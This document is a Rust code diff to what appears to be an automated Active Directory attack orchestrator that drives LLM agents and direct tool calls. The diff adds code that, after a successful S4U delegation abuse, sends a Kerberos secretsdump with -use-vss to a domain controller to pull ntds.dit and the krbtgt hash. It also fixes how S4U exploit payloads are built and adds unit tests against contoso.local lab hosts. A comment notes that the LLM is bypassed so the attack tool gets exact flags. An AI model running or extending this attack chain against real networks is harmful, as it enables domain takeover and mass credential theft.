@@ -17,7 +17,7 @@ use tokio::time::Instant;
 use tracing::{debug, info, warn};
 
 use crate::orchestrator::dispatcher::Dispatcher;
-use crate::orchestrator::state::StateInner;
+use crate::orchestrator::state::{StateInner, DEDUP_SECRETSDUMP};
 
 /// Cooldown after a failed S4U attempt before retrying the same vuln.
 /// Set to 5 minutes to wait for AD account lockout to expire.
@@ -176,6 +176,192 @@ pub async fn auto_s4u_exploitation(
     }
 }
 
+/// Given a delegation vuln whose S4U just succeeded, decide whether that S4U
+/// produced an `Administrator` ticket usable for a DCSync of a domain DC.
+///
+/// An S4U impersonates `Administrator` against the delegation-target SPN
+/// (`cifs/<host>`). That Administrator ticket authorizes a DCSync only when the
+/// SPN host IS a domain controller. Returns `(dc_ip, dc_fqdn, domain)` when the
+/// delegation target is a known DC whose domain is not yet dominated; `None`
+/// otherwise. Pure over `StateInner` so the gate unit-tests without a live
+/// `Dispatcher`.
+pub(crate) fn plan_post_s4u_dump(
+    state: &StateInner,
+    vuln_id: &str,
+) -> Option<(String, String, String)> {
+    let vuln = state.discovered_vulnerabilities.get(vuln_id)?;
+    let vtype = vuln.vuln_type.to_lowercase();
+    if vtype != "constrained_delegation" && vtype != "rbcd" {
+        return None;
+    }
+
+    // Host portion of the delegation-target SPN ("cifs/host.fqdn:port@REALM").
+    let spn = vuln
+        .details
+        .get("delegation_target")
+        .and_then(|v| v.as_str())
+        .or_else(|| {
+            vuln.details
+                .get("AllowedToDelegate")
+                .and_then(|v| v.as_str())
+        })?;
+    let spn_host = spn
+        .split('/')
+        .nth(1)
+        .unwrap_or(spn)
+        .split([':', '@'])
+        .next()
+        .unwrap_or("")
+        .to_lowercase();
+    if spn_host.is_empty() {
+        return None;
+    }
+    let spn_short = spn_host.split('.').next().unwrap_or(&spn_host).to_owned();
+
+    // The delegation target must be a known DC for the Administrator ticket to
+    // authorize a DCSync.
+    let dc = state.hosts.iter().find(|h| {
+        h.is_dc
+            && (h.ip == spn_host
+                || h.hostname.to_lowercase() == spn_host
+                || h.hostname
+                    .to_lowercase()
+                    .split('.')
+                    .next()
+                    .map(|s| s == spn_short.as_str())
+                    .unwrap_or(false))
+    })?;
+
+    // Domain: the vuln detail if present, else the DC's FQDN minus its host label.
+    let domain = vuln
+        .details
+        .get("domain")
+        .and_then(|v| v.as_str())
+        .map(str::to_lowercase)
+        .filter(|s| !s.is_empty())
+        .or_else(|| {
+            dc.hostname
+                .to_lowercase()
+                .split_once('.')
+                .map(|(_, rest)| rest.to_string())
+        })?;
+    if domain.is_empty() || state.dominated_domains.contains(&domain) {
+        return None;
+    }
+
+    let dc_ip = if dc.ip.is_empty() {
+        state.resolve_dc_ip(&domain)?
+    } else {
+        dc.ip.clone()
+    };
+    // Return the SPN host as the dump target: impacket derives the Kerberos SPN
+    // from `target`, so it must match the CIFS/<host> service ticket the S4U
+    // wrote — an FQDN target trips SMB SPN validation when the ticket is
+    // short-name. `target_ip`/`dc_ip` carry the real connection IP.
+    Some((dc_ip, spn_host, domain))
+}
+
+/// After a successful S4U to `cifs/<dc>`, dispatch a Kerberos `secretsdump`
+/// against that DC using the Administrator ccache the S4U just wrote. The
+/// credential resolver injects `ticket_path` (via `find_ccache` for the
+/// `Administrator` principal). Deduped on `(dc_ip, domain)` so a stuck dump
+/// isn't re-dispatched every 20s tick.
+pub(crate) async fn maybe_dispatch_post_s4u_secretsdump(
+    dispatcher: &Arc<Dispatcher>,
+    vuln_id: &str,
+) {
+    let (dc_ip, target_host, domain, dedup_key) = {
+        let state = dispatcher.state.read().await;
+        let Some((dc_ip, target_host, domain)) = plan_post_s4u_dump(&state, vuln_id) else {
+            return;
+        };
+        let dedup_key = format!("post_s4u_dump:{dc_ip}:{domain}");
+        if state.is_processed(DEDUP_SECRETSDUMP, &dedup_key) {
+            return;
+        }
+        (dc_ip, target_host, domain, dedup_key)
+    };
+
+    {
+        let mut state = dispatcher.state.write().await;
+        if state.is_processed(DEDUP_SECRETSDUMP, &dedup_key) {
+            return; // lost the race with a concurrent dispatch
+        }
+        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
+    }
+    let _ = dispatcher
+        .state
+        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
+        .await;
+
+    // DIRECT tool dispatch (no LLM). Submitting an LLM task lets the agent pick
+    // the args, and it drops `-use-vss` — falling back to DRSUAPI DCSync, which
+    // fails KDC_ERR_PREAUTH_FAILED on a CIFS-only S4U ticket (verified on box).
+    // A direct ToolCall forces the exact flags: -use-vss snapshots ntds.dit over
+    // the SMB admin session the CIFS ticket grants; `target` is the SPN short
+    // host so impacket's derived SPN matches the ticket (an FQDN target trips SMB
+    // SPN validation). The worker's credential resolver injects ticket_path from
+    // the Administrator ccache, and the dispatch pipeline auto-publishes the
+    // dumped krbtgt to state.
+    let call = ares_llm::ToolCall {
+        id: format!("post_s4u_dump_{}", uuid::Uuid::new_v4().simple()),
+        name: "secretsdump_kerberos".to_string(),
+        arguments: json!({
+            "target": &target_host,
+            "target_ip": &dc_ip,
+            "dc_ip": &dc_ip,
+            "domain": &domain,
+            "username": "Administrator",
+            "no_pass": true,
+            "use_vss": true,
+        }),
+    };
+    let task_id = format!(
+        "post_s4u_dump_{}",
+        &uuid::Uuid::new_v4().simple().to_string()[..12]
+    );
+    info!(
+        task_id = %task_id,
+        dc = %dc_ip,
+        target = %target_host,
+        domain = %domain,
+        "Post-S4U Kerberos secretsdump dispatched (direct tool, -use-vss, no LLM)"
+    );
+
+    let dispatcher_bg = dispatcher.clone();
+    tokio::spawn(async move {
+        let clear_dedup = || async {
+            {
+                let mut s = dispatcher_bg.state.write().await;
+                s.unmark_processed(DEDUP_SECRETSDUMP, &dedup_key);
+            }
+            let _ = dispatcher_bg
+                .state
+                .unpersist_dedup(&dispatcher_bg.queue, DEDUP_SECRETSDUMP, &dedup_key)
+                .await;
+        };
+        match dispatcher_bg
+            .llm_runner
+            .tool_dispatcher()
+            .dispatch_tool("credential_access", &task_id, &call)
+            .await
+        {
+            Ok(r) if r.error.is_none() => info!(
+                task_id = %task_id,
+                "Post-S4U secretsdump completed (krbtgt auto-published if dumped)"
+            ),
+            Ok(r) => {
+                warn!(err = ?r.error, task_id = %task_id, "Post-S4U secretsdump errored — clearing dedup for retry");
+                clear_dedup().await;
+            }
+            Err(e) => {
+                warn!(err = %e, task_id = %task_id, "Post-S4U secretsdump dispatch failed — clearing dedup for retry");
+                clear_dedup().await;
+            }
+        }
+    });
+}
+
 pub(crate) struct S4uWork {
     pub vuln: ares_core::models::VulnerabilityInfo,
     pub credential: Option<ares_core::models::Credential>,
@@ -241,7 +427,22 @@ pub(crate) fn select_s4u_work_items(
                         .get("AllowedToDelegate")
                         .and_then(|v| v.as_str())
                 })
-                .map(|s| s.to_string());
+                .map(|s| s.to_string())
+                .filter(|s| !s.trim().is_empty());
+
+            // impacket-getST -impersonate requires a target SPN; without one
+            // s4u_attack bails at `required_str(args, "target_spn")`. Skip
+            // now so the dispatch counter isn't burned on a guaranteed
+            // failure. The SPN may be re-populated later (e.g. via a fresh
+            // BloodHound edge) — we simply skip this tick, we don't block.
+            if target_spn.is_none() {
+                debug!(
+                    vuln_id = %vuln.vuln_id,
+                    vuln_type = %vuln.vuln_type,
+                    "S4U skipped: target_spn missing from delegation vuln"
+                );
+                return None;
+            }
 
             let credential = account_name.as_ref().and_then(|acct| {
                 state
@@ -272,10 +473,12 @@ pub(crate) fn select_s4u_work_items(
                 .or_else(|| hash.as_ref().map(|h| h.domain.clone()))
                 .unwrap_or_default();
 
-            let dc_ip = state
-                .domain_controllers
-                .get(&domain.to_lowercase())
-                .cloned();
+            // Resolve the DC IP hosts-aware. `domain_controllers` is often empty
+            // or mis-mapped (a sibling domain's DC labeled under this one), which
+            // sends the S4U to the wrong realm (KDC_ERR_WRONG_REALM). resolve_dc_ip
+            // falls back to the is_dc host whose FQDN is in this domain, e.g.
+            // dc01.contoso.local resolves to the contoso.local DC IP.
+            let dc_ip = state.resolve_dc_ip(&domain);
 
             Some(S4uWork {
                 vuln: vuln.clone(),
@@ -306,6 +509,16 @@ pub(crate) fn build_s4u_payload(item: &S4uWork) -> Value {
         payload["target_spn"] = json!(spn);
     }
     if let Some(ref dc) = item.dc_ip {
+        // Emit the hosts-aware DC IP under `dc_ip` — the exact arg getST /
+        // s4u_attack reads for `-dc-ip` (the KDC of the delegating account's
+        // realm). `target_ip` is a dead field here: the worker normalizer maps
+        // it to `target`/`targets`, and the s4u_attack tool ignores `target`
+        // entirely, so a DC IP passed only as `target_ip` never reaches
+        // `-dc-ip`. impacket then resolves the KDC via DNS and, when
+        // `domain_controllers` lacks this realm, hits the wrong DC
+        // (KDC_ERR_WRONG_REALM / silent wrong-DC dispatch). Keep `target_ip`
+        // too so the credential resolver can still DC-map-infer the domain.
+        payload["dc_ip"] = json!(dc);
         payload["target_ip"] = json!(dc);
     }
 
@@ -658,7 +871,7 @@ mod tests {
         assert!(!should_reset_failure_count(&tr));
     }
 
-    // -- helpers for select_s4u_work_items / build_s4u_payload tests --
+    // helpers for select_s4u_work_items / build_s4u_payload tests
 
     fn make_delegation_vuln(
         vuln_id: &str,
@@ -718,8 +931,6 @@ mod tests {
             trust_pair_label: None,
         }
     }
-
-    // --- select_s4u_work_items -------------------------------------------
 
     #[test]
     fn select_skips_non_delegation_vuln_types() {
@@ -788,7 +999,12 @@ mod tests {
     #[test]
     fn select_allows_after_cooldown_expires() {
         let mut s = StateInner::new("op-test".into());
-        let v = make_delegation_vuln("v-rbcd-svc_web", "rbcd", Some("svc_web"), None);
+        let v = make_delegation_vuln(
+            "v-rbcd-svc_web",
+            "rbcd",
+            Some("svc_web"),
+            Some("CIFS/dc01.contoso.local"),
+        );
         s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
         s.credentials
             .push(make_cred("svc_web", "Pw!", "contoso.local"));
@@ -801,6 +1017,44 @@ mod tests {
         let work = select_s4u_work_items(&s, &tracker, now);
         assert_eq!(work.len(), 1);
         assert_eq!(work[0].vuln.vuln_id, "v-rbcd-svc_web");
+    }
+
+    #[test]
+    fn select_skips_delegation_vuln_without_target_spn() {
+        let mut s = StateInner::new("op-test".into());
+        // constrained_delegation with matching cred but no delegation_target/AllowedToDelegate.
+        let v = make_delegation_vuln(
+            "v-cd-no-spn",
+            "constrained_delegation",
+            Some("svc_sql"),
+            None,
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+        s.credentials
+            .push(make_cred("svc_sql", "Pw!", "contoso.local"));
+        assert!(select_s4u_work_items(&s, &HashMap::new(), Instant::now()).is_empty());
+    }
+
+    #[test]
+    fn select_skips_delegation_vuln_with_blank_target_spn() {
+        let mut s = StateInner::new("op-test".into());
+        let mut details = std::collections::HashMap::new();
+        details.insert("account_name".into(), json!("svc_sql"));
+        details.insert("delegation_target".into(), json!("   "));
+        let v = ares_core::models::VulnerabilityInfo {
+            vuln_id: "v-cd-blank-spn".into(),
+            vuln_type: "constrained_delegation".into(),
+            target: "192.168.58.50".into(),
+            discovered_by: "test".into(),
+            discovered_at: Utc::now(),
+            details,
+            recommended_agent: String::new(),
+            priority: 1,
+        };
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+        s.credentials
+            .push(make_cred("svc_sql", "Pw!", "contoso.local"));
+        assert!(select_s4u_work_items(&s, &HashMap::new(), Instant::now()).is_empty());
     }
 
     #[test]
@@ -847,7 +1101,12 @@ mod tests {
     #[test]
     fn select_picks_credential_case_insensitively() {
         let mut s = StateInner::new("op-test".into());
-        let v = make_delegation_vuln("v-rbcd-SvcSql", "rbcd", Some("SvcSql"), None);
+        let v = make_delegation_vuln(
+            "v-rbcd-SvcSql",
+            "rbcd",
+            Some("SvcSql"),
+            Some("CIFS/dc01.contoso.local"),
+        );
         s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
         s.credentials
             .push(make_cred("svcsql", "Pw!", "contoso.local"));
@@ -859,7 +1118,12 @@ mod tests {
     #[test]
     fn select_falls_back_to_ntlm_hash_when_no_password_cred() {
         let mut s = StateInner::new("op-test".into());
-        let v = make_delegation_vuln("v-rbcd-svc", "rbcd", Some("svc"), None);
+        let v = make_delegation_vuln(
+            "v-rbcd-svc",
+            "rbcd",
+            Some("svc"),
+            Some("CIFS/dc01.contoso.local"),
+        );
         s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
         s.hashes.push(make_hash("svc", "deadbeef", "contoso.local"));
         let work = select_s4u_work_items(&s, &HashMap::new(), Instant::now());
@@ -872,7 +1136,12 @@ mod tests {
     #[test]
     fn select_skips_non_ntlm_hashes() {
         let mut s = StateInner::new("op-test".into());
-        let v = make_delegation_vuln("v-rbcd-svc", "rbcd", Some("svc"), None);
+        let v = make_delegation_vuln(
+            "v-rbcd-svc",
+            "rbcd",
+            Some("svc"),
+            Some("CIFS/dc01.contoso.local"),
+        );
         s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
         let mut h = make_hash("svc", "deadbeef", "contoso.local");
         h.hash_type = "AES256".into();
@@ -883,7 +1152,12 @@ mod tests {
     #[test]
     fn select_populates_dc_ip_from_domain_controllers() {
         let mut s = StateInner::new("op-test".into());
-        let v = make_delegation_vuln("v-rbcd-svc", "rbcd", Some("svc"), None);
+        let v = make_delegation_vuln(
+            "v-rbcd-svc",
+            "rbcd",
+            Some("svc"),
+            Some("CIFS/dc01.contoso.local"),
+        );
         s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
         s.credentials.push(make_cred("svc", "Pw!", "contoso.local"));
         s.domain_controllers
@@ -909,8 +1183,18 @@ mod tests {
     #[test]
     fn select_accepts_constrained_delegation_and_rbcd_only() {
         let mut s = StateInner::new("op-test".into());
-        let cd = make_delegation_vuln("v-cd", "Constrained_Delegation", Some("svc1"), None);
-        let rbcd = make_delegation_vuln("v-rb", "RBCD", Some("svc2"), None);
+        let cd = make_delegation_vuln(
+            "v-cd",
+            "Constrained_Delegation",
+            Some("svc1"),
+            Some("CIFS/dc01.contoso.local"),
+        );
+        let rbcd = make_delegation_vuln(
+            "v-rb",
+            "RBCD",
+            Some("svc2"),
+            Some("CIFS/dc02.contoso.local"),
+        );
         s.discovered_vulnerabilities.insert(cd.vuln_id.clone(), cd);
         s.discovered_vulnerabilities
             .insert(rbcd.vuln_id.clone(), rbcd);
@@ -921,8 +1205,6 @@ mod tests {
         let work = select_s4u_work_items(&s, &HashMap::new(), Instant::now());
         assert_eq!(work.len(), 2);
     }
-
-    // --- build_s4u_payload -----------------------------------------------
 
     fn work_with_credential() -> S4uWork {
         let vuln = make_delegation_vuln(
@@ -950,6 +1232,9 @@ mod tests {
         assert_eq!(p["domain"], "contoso.local");
         assert_eq!(p["impersonate"], "Administrator");
         assert_eq!(p["target_spn"], "CIFS/dc01.contoso.local");
+        // The DC IP must reach the tool under `dc_ip` (→ getST `-dc-ip`), not
+        // only `target_ip` (which the worker maps to the unused `target`).
+        assert_eq!(p["dc_ip"], "192.168.58.10");
         assert_eq!(p["target_ip"], "192.168.58.10");
         assert_eq!(p["username"], "svc_sql");
         assert_eq!(p["password"], "P@ssw0rd!");
@@ -1000,6 +1285,20 @@ mod tests {
         w.dc_ip = None;
         let p = build_s4u_payload(&w);
         assert!(p.get("target_ip").is_none());
+        assert!(p.get("dc_ip").is_none());
+    }
+
+    #[test]
+    fn build_payload_sets_dc_ip_for_getst_dc_flag() {
+        // Regression: the resolved DC IP must be emitted as `dc_ip` (the arg
+        // getST/s4u_attack reads for `-dc-ip`). When it was only set as
+        // `target_ip`, the worker normalizer mapped it to the unused `target`
+        // and `-dc-ip` was omitted — impacket resolved the KDC via DNS and hit
+        // the wrong DC when `domain_controllers` lacked the realm.
+        let mut w = work_with_credential();
+        w.dc_ip = Some("192.168.58.240".into());
+        let p = build_s4u_payload(&w);
+        assert_eq!(p["dc_ip"], "192.168.58.240");
     }
 
     #[test]
@@ -1011,5 +1310,89 @@ mod tests {
         assert_eq!(p["password"], "P@ssw0rd!");
         assert!(p.get("hash").is_none());
         assert!(p.get("auth_method").is_none());
+    }
+
+    // plan_post_s4u_dump (Fix D gate)
+
+    fn host(ip: &str, hostname: &str, is_dc: bool) -> ares_core::models::Host {
+        ares_core::models::Host {
+            ip: ip.to_string(),
+            hostname: hostname.to_string(),
+            os: String::new(),
+            roles: Vec::new(),
+            services: Vec::new(),
+            is_dc,
+            owned: false,
+        }
+    }
+
+    #[test]
+    fn plan_post_s4u_dump_fires_when_deleg_target_is_dc() {
+        let mut s = StateInner::new("op-test".into());
+        let v = make_delegation_vuln(
+            "cd-jon",
+            "constrained_delegation",
+            Some("jon"),
+            Some("CIFS/dc01.contoso.local"),
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+        s.hosts
+            .push(host("192.168.58.10", "dc01.contoso.local", true));
+        // target = the SPN host from the delegation_target (matches the S4U ticket).
+        assert_eq!(
+            plan_post_s4u_dump(&s, "cd-jon"),
+            Some((
+                "192.168.58.10".to_string(),
+                "dc01.contoso.local".to_string(),
+                "contoso.local".to_string(),
+            ))
+        );
+    }
+
+    #[test]
+    fn plan_post_s4u_dump_skips_non_dc_delegation_target() {
+        let mut s = StateInner::new("op-test".into());
+        let v = make_delegation_vuln(
+            "cd-web",
+            "constrained_delegation",
+            Some("svc"),
+            Some("CIFS/web01.contoso.local"),
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+        // web01 is not a DC → the Administrator ticket can't DCSync.
+        s.hosts
+            .push(host("192.168.58.20", "web01.contoso.local", false));
+        assert!(plan_post_s4u_dump(&s, "cd-web").is_none());
+    }
+
+    #[test]
+    fn plan_post_s4u_dump_skips_already_dominated_domain() {
+        let mut s = StateInner::new("op-test".into());
+        let v = make_delegation_vuln(
+            "cd-jon",
+            "constrained_delegation",
+            Some("jon"),
+            Some("CIFS/dc01.contoso.local"),
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+        s.hosts
+            .push(host("192.168.58.10", "dc01.contoso.local", true));
+        s.dominated_domains.insert("contoso.local".to_string());
+        assert!(plan_post_s4u_dump(&s, "cd-jon").is_none());
+    }
+
+    #[test]
+    fn plan_post_s4u_dump_skips_non_delegation_vuln_type() {
+        let mut s = StateInner::new("op-test".into());
+        let v = make_delegation_vuln(
+            "esc1-x",
+            "esc1",
+            Some("svc"),
+            Some("CIFS/dc01.contoso.local"),
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+        s.hosts
+            .push(host("192.168.58.10", "dc01.contoso.local", true));
+        assert!(plan_post_s4u_dump(&s, "esc1-x").is_none());
     }
 }
